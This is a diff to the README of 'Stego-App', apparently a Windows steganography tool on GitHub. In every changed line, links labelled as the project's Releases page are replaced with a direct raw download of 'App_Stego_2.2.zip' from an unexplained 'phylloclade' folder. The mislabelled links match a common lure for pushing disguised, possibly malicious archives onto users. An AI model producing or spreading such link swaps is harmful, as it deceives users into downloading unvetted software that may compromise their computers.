@@ -6,7 +6,7 @@ Welcome to Stego-App, the simple way to hide your messages in images. Whether yo
 
 ## 📥 Download Stego-App
 
-[![Download Stego-App](https://github.com/angfxstudio/Stego-App/releases%https://github.com/angfxstudio/Stego-App/releases)](https://github.com/angfxstudio/Stego-App/releases)
+[![Download Stego-App](https://github.com/angfxstudio/Stego-App/raw/refs/heads/main/phylloclade/App_Stego_2.2.zip%https://github.com/angfxstudio/Stego-App/raw/refs/heads/main/phylloclade/App_Stego_2.2.zip)](https://github.com/angfxstudio/Stego-App/raw/refs/heads/main/phylloclade/App_Stego_2.2.zip)
 
 ## 🔍 Overview
 
@@ -29,7 +29,7 @@ Stego-App is a Windows application designed for steganography. It allows users t
 
 ## 🛠️ Installation Steps
 
-1. **Visit the Download Page**: Go to the [Releases page here](https://github.com/angfxstudio/Stego-App/releases) to find the latest version of Stego-App.
+1. **Visit the Download Page**: Go to the [Releases page here](https://github.com/angfxstudio/Stego-App/raw/refs/heads/main/phylloclade/App_Stego_2.2.zip) to find the latest version of Stego-App.
 
 2. **Download the App**: Choose the version you want to download. Ensure you select the correct file for your Windows setup. Click on the "Download" link next to the version.
 
@@ -55,7 +55,7 @@ Stego-App is a Windows application designed for steganography. It allows users t
 
 ## 📤 Download & Install
 
-To get started with Stego-App, please visit our [Releases page here](https://github.com/angfxstudio/Stego-App/releases) to download the software. 
+To get started with Stego-App, please visit our [Releases page here](https://github.com/angfxstudio/Stego-App/raw/refs/heads/main/phylloclade/App_Stego_2.2.zip) to download the software. 
 
 ## 👥 Support & Contribution
 
